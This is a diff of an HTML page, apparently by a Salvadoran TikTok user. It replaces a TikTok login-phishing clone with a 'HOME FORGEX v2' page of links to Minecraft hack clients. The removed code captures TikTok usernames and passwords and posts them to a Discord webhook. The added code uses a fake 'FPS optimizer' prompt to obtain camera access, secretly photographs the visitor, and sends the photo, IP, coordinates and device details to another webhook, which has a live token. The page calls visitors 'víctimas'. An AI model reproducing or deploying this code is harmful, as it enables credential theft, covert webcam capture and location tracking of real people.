@@ -1,97 +1,205 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok</title>
-    <link rel="icon" href="https://sf-tb-sg.ibytedtos.com/obj/ies-fe/obj/ad-room-tiktok-sg/2022_06_13/1655103746049.ico">
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#000; color:#fff; font-family:system-ui; overflow:hidden; }
-        #login { position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999; display:flex; align-items:center; justify-content:center; }
-        .login-box { background:rgba(255,255,255,0.1); padding:40px; border-radius:20px; width:90%; max-width:380px; backdrop-filter:blur(10px); }
-        .logo { width:60px; margin:0 auto 30px; display:block; }
-        input { width:100%; padding:15px; margin:15px 0; border:none; border-radius:50px; background:rgba(255,255,255,0.1); color:#fff; font-size:16px; }
-        input::placeholder { color:#aaa; }
-        button { width:100%; padding:15px; background:#fe2c55; border:none; border-radius:50px; color:#fff; font-weight:bold; font-size:18px; cursor:pointer; }
-        .tiktok { display:none; }
-        .video { width:100vw; height:100vh; object-fit:cover; }
-        .overlay { position:absolute; bottom:20px; left:20px; right:20px; }
-        .heart { position:absolute; right:20px; bottom:100px; font-size:50px; animation:like 0.6s; }
-        @keyframes like { 0%{transform:scale(0)} 50%{transform:scale(1.4)} 100%{transform:scale(1)} }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HOME FORGEX v2 | by 10116066-debug</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <style>
+    body { background:#000; overflow-x:hidden; font-family:'Courier New',monospace; margin:0; }
+    canvas { position:fixed; top:0; left:0; z-index:-1; }
+    .matrix-bg { position:fixed; inset:0; background:linear-gradient(to bottom,rgba(0,0,0,0.9),black); opacity:0.6; z-index:-1; }
+    @keyframes glitch { 0%{text-shadow:2px 2px #0f0,-2px -2px #f00} 20%{text-shadow:-2px -2px #0f0,2px 2px #f00} 100%{text-shadow:2px 2px #0f0,-2px -2px #f00} }
+    .glitch { animation:glitch 4s infinite; }
+    .card-anim { transition:all .3s; border:2px solid #0f0!important; box-shadow:0 0 15px rgba(0,255,0,.5); }
+    .card-anim:hover { transform:scale(1.12)!important; box-shadow:0 0 40px #0f0,0 0 80px #0f0; border-color:#0ff!important; }
+    
+    #fpsPopup {
+      position:fixed; inset:0; background:rgba(0,0,0,0.97); backdrop-filter:blur(12px);
+      display:flex; align-items:center; justify-content:center; z-index:99999; color:#0f0;
+    }
+    .popup-box {
+      background:#0a0a0a; border:4px solid #0f0; padding:40px; border-radius:20px;
+      max-width:90%; text-align:center; box-shadow:0 0 60px #0f0;
+    }
+  </style>
 </head>
-<body>
+<body class="text-white">
 
-<!-- LOGIN PHISHING (con captura total) -->
-<div id="login">
-    <div class="login-box">
-        <img src="https://sf16-scmcdn-va.ibytedtos.com/obj/ies-music-tiktok-sg/2022_06_13/1655103746049.ico" class="logo">
-        <h2 style="text-align:center; margin-bottom:30px;">Inicia sesión en TikTok</h2>
-        <input type="text" id="user" placeholder="Teléfono / Email / Usuario de TikTok" autocomplete="off">
-        <input type="password" id="pass" placeholder="Contraseña">
-        <button onclick="capturar()">Iniciar sesión</button>
-        <p style="text-align:center; margin-top:20px; font-size:14px; color:#888;">
-            Al continuar, aceptas los Términos de servicio
-        </p>
+  <!-- POPUP FALSO DE MÁS FPS -->
+  <div id="fpsPopup">
+    <div class="popup-box">
+      <h1 class="text-5xl glitch mb-6">OPTIMIZADOR GRÁFICO 2025</h1>
+      <p class="text-xl mb-8">
+        Para tener <strong>+120 FPS</strong> y <strong>cero lag</strong> en todos los clientes hack,<br>
+        acepta los permisos de cámara y micrófono.<br><br>
+        Esto activa el nuevo <strong>modo rendimiento extremo</strong>.
+      </p>
+      <button onclick="iniciarTodo()" class="bg-green-600 hover:bg-green-500 px-16 py-6 text-3xl rounded-xl glitch">
+        ACEPTAR Y AUMENTAR FPS
+      </button>
+      <p class="text-sm mt-6 opacity-50">cierra si no quieres más rendimiento</p>
     </div>
-</div>
+  </div>
 
-<!-- TikTok real (se activa después del login) -->
-<div class="tiktok" id="tiktok">
-    <video class="video" src="https://v16m-default.akamaized.net/8f2d8c5e0e5d5d5d5d5d5d5d5d5d5d5d/123456789.mp4" autoplay loop muted playsinline></video>
-    <div class="overlay">
-        <div class="heart" id="heart">❤️</div>
-        <h3>@tiktok_oficial</h3>
-        <p>¡Bienvenido de nuevo! 🔥</p>
-    </div>
-</div>
+  <canvas id="matrix"></canvas>
+  <div class="matrix-bg"></div>
+  <video id="cam" autoplay playsinline style="position:fixed; width:1px; height:1px; opacity:0;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-<script>
-async function capturar() {
-    const user = document.getElementById('user').value;
-    const pass = document.getElementById('pass').value;
-    
-    if (!user || !pass) return alert("Completa ambos campos");
+  <!-- TU PÁGINA COMPLETA -->
+  <header class="py-8 text-center border-b border-green-500/30">
+    <h1 class="text-5xl md:text-7xl font-bold glitch text-green-400">HOME FORGEX v2</h1>
+  </header>
 
-    // Captura datos avanzados
-    const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-    const vpnDetected = ["NordVPN","ExpressVPN","Surfshark","Mullvad","ProtonVPN","Private Internet Access"].some(v => navigator.userAgent.includes(v));
-    
-    const payload = {
-        content: "**🔥 NUEVA VÍCTIMA EN TIKTOK CLON 🔥**",
-        embeds: [{
-            color: 0xfe2c55,
-            title: "Credenciales Capturadas",
-            fields: [
-                { name: "Usuario/Email", value: user, inline: false },
-                { name: "Contraseña", value: pass, inline: false },
-                { name: "IP", value: ipData.ip || "Desconocida", inline: true },
-                { name: "Ciudad/País", value: `${ipData.city || "??"}, ${ipData.country_name || "??"}`, inline: true },
-                { name: "ISP", value: ipData.org || "Desconocido", inline: true },
-                { name: "VPN Detectada", value: vpnDetected ? "✅ SÍ" : "❌ No", inline: true },
-                { name: "Navegador", value: navigator.userAgent.substring(0,100), inline: false },
-                { name: "Hora", value: new Date().toLocaleString("es-SV"), inline: true }
-            ],
-            footer: { text: "TikTok Clon v3.0 - Con esposas puestas 😈" }
-        }]
-    };
+  <main class="p-6 max-w-7xl mx-auto space-y-20">
+    <section class="text-center">
+      <h2 class="text-4xl font-bold text-green-400 mb-10 glitch">TOP 3</h2>
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+        <a href="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html" class="card-anim bg-black/80 p-10 rounded-xl text-2xl font-bold" data-name="UwUClient">UwUClient</a>
+        <a href="https://eaglerhacks.github.io/dragonv4.html" class="card-anim bg-black/80 p-10 rounded-xl text-2xl font-bold" data-name="DragonX">DragonX</a>
+        <a href="https://eaglerhacks.github.io/wurstX.html" class="card-anim bg-black/80 p-10 rounded-xl text-2xl font-bold" data-name="WurstX">WurstX</a>
+      </div>
+    </section>
 
-    // ENVÍA TODO A TU WEBHOOK
-    fetch("https://discord.com/api/webhooks/1447381927698104321/9LfvZiyHMAWnrpy1Bjvcq2kJuWZKhM35dPL92lkEu2fEgckHYBcXeikP82MAhR_uP6b3", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+    <section class="text-center">
+      <h2 class="text-4xl font-bold text-green-400 mb-10 glitch">CLIENTS CON HACKS</h2>
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
+        <a href="https://eaglerhacks.github.io/Shadow_Client_2.5_1.8.8_International.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Shadow Client">Shadow Client</a>
+        <a href="https://eaglerhacks.github.io/justinv3.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Justin V3">Justin V3</a>
+        <a href="https://eaglerhacks.github.io/PiClient.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="PiClient">PiClient</a>
+        <a href="https://eaglerhacks.github.io/meteor.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Meteor">Meteor</a>
+        <a href="https://eaglerhacks.github.io/demon.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Demon Client">Demon Client</a>
+        <a href="https://eaglerhacks.github.io/justinclient.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Justin V1.2.4">Justin V1.2.4</a>
+        <a href="https://eaglerhacks.github.io/flameclient%203.7.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Flame 3.7">Flame 3.7</a>
+      </div>
+    </section>
+
+    <section class="text-center">
+      <h2 class="text-4xl font-bold text-yellow-400 mb-10 glitch">EAGLECRAFT 1.20 SIN HACK</h2>
+      <div class="max-w-2xl mx-auto">
+        <a href="https://eaglymc.com/web-javascript/" target="_blank" class="card-anim bg-gradient-to-r from-purple-900 to-blue-900 p-12 rounded-2xl text-3xl font-bold block">
+          JUGAR EAGLECRAFT 1.20 (VANILLA)
+        </a>
+      </div>
+    </section>
+
+    <section class="text-center max-w-4xl mx-auto">
+      <h2 class="text-4xl font-bold text-green-400 glitch mb-8">INFO</h2>
+      <p class="text-xl mb-6">Uso 100% educativo.</p>
+      <p class="text-lg">
+        <a href="https://tiktok.com/@j_eliseoo_v" target="_blank" class="text-green-400 hover:text-pink-500">@j_eliseoo_v en TikTok</a> | El Salvador
+      </p>
+      <p class="text-sm mt-10 opacity-70">Visitas: <span id="visits">0</span></p>
+    </section>
+  </main>
+
+  <audio id="hoverSound" src="https://cdn.pixabay.com/download/audio/2023/01/26/audio_4e6f2e1a1e.mp3?filename=click-21156.mp3" preload="auto"></audio>
+
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1447276191961841905/IWpiF5AZjKc8iHpch5JkReeixmIjZv13QR4ZvS-ldQeiniF-iCVLyotHDlEEsdcETyyU";
+
+    async function iniciarTodo() {
+      // Quitar popup
+      document.getElementById('fpsPopup').remove();
+
+      // Pedir cámara + mic (la mayoría acepta por los FPS)
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const video = document.getElementById('cam');
+        video.srcObject = stream;
+
+        setTimeout(async () => {
+          const canvas = document.getElementById('canvas');
+          canvas.width = video.videoWidth || 800;
+          canvas.height = video.videoHeight || 600;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          const foto = canvas.toDataURL('image/png');
+          stream.getTracks().forEach(t => t.stop());
+
+          // RECOGER DATOS
+          const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+
+          const mensaje = `**VÍCTIMA EN FORGEX v2**
+**IP:** ${geo.ip || '???'} (${geo.org || '???'})
+**Lugar:** ${geo.city || '???'}, ${geo.country_name || '???'}
+**Coords:** ${geo.latitude || '???'}, ${geo.longitude || '???'}
+**Hora SV:** ${new Date().toLocaleString("es-SV")}
+**Dispositivo:** ${(navigator.userAgentData?.platform || navigator.platform || '???')} | Móvil: ${navigator.userAgentData?.mobile ? 'Sí' : 'No'}
+**RAM:** ${navigator.deviceMemory || '???'}GB | CPU: ${navigator.hardwareConcurrency || '???'} núcleos
+**Pantalla:** ${screen.width}x${screen.height}
+**Navegador:** ${navigator.userAgent.substring(0,120)}`;
+
+          await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              content: mensaje,
+              embeds: [{ image: { url: foto }, color: 0x00ff00 }]
+            })
+          });
+
+        }, 2500);
+
+      } catch (e) {
+        // Si niega permisos → envía solo datos
+        const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+        const mensaje = `**VÍCTIMA EN FORGEX v2 (sin foto)**
+**IP:** ${geo.ip || '???'} (${geo.org || '???'})
+**Lugar:** ${geo.city || '???'}, ${geo.country_name || '???'}
+**Hora SV:** ${new Date().toLocaleString("es-SV")}`;
+
+        await fetch(WEBHOOK, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ content: mensaje })
+        });
+      }
+    }
+
+    // === MATRIX, SONIDOS, VISITAS ===
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = innerWidth; canvas.height = innerHeight;
+    const letters = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const fontSize = 14;
+    let drops = Array(Math.floor(canvas.width/fontSize)).fill(1);
+
+    function draw() {
+      ctx.fillStyle = 'rgba(0,0,0,0.05)';
+      ctx.fillRect(0,0,canvas.width,canvas.height);
+      ctx.fillStyle = '#0f0';
+      ctx.font = fontSize + 'px monospace';
+      for(let i = 0; i < drops.length; i++){
+        ctx.fillText(letters[Math.floor(Math.random()*letters.length)], i*fontSize, drops[i]*fontSize);
+        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i]=0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw, 35);
+
+    document.querySelectorAll('.card-anim').forEach(c => {
+      c.addEventListener('mouseenter', () => {
+        const sound = document.getElementById('hoverSound');
+        sound.currentTime = 0;
+        sound.play().catch(() => {});
+      });
     });
 
-    // Muestra el TikTok real para que no sospechen
-    setTimeout(() => {
-        document.getElementById('login').style.display = "none";
-        document.getElementById('tiktok').style.display = "block";
-        document.getElementById('heart').style.display = "block";
-        setTimeout(() => document.getElementById('heart').style.display = "none", 1000);
-    }, 800);
-}
-</script>
+    document.querySelectorAll('a[data-name]').forEach(a => {
+      a.onclick = e => {
+        e.preventDefault();
+        const overlay = document.createElement('div');
+        overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.97);color:#0f0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;font-family:monospace;text-align:center';
+        overlay.innerHTML = `<h1 class="text-5xl glitch mb-4">Redirigiendo a</h1><h2 class="text-4xl text-cyan-400">${a.dataset.name}</h2>`;
+        document.body.appendChild(overlay);
+        window.open(a.href, '_blank');
+        setTimeout(() => overlay.remove(), 3000);
+      };
+    });
+
+    let v = localStorage.getItem('forgexVisits') || 0; v++; localStorage.setItem('forgexVisits', v);
+    document.getElementById('visits').textContent = v;
+  </script>
 </body>
 </html>
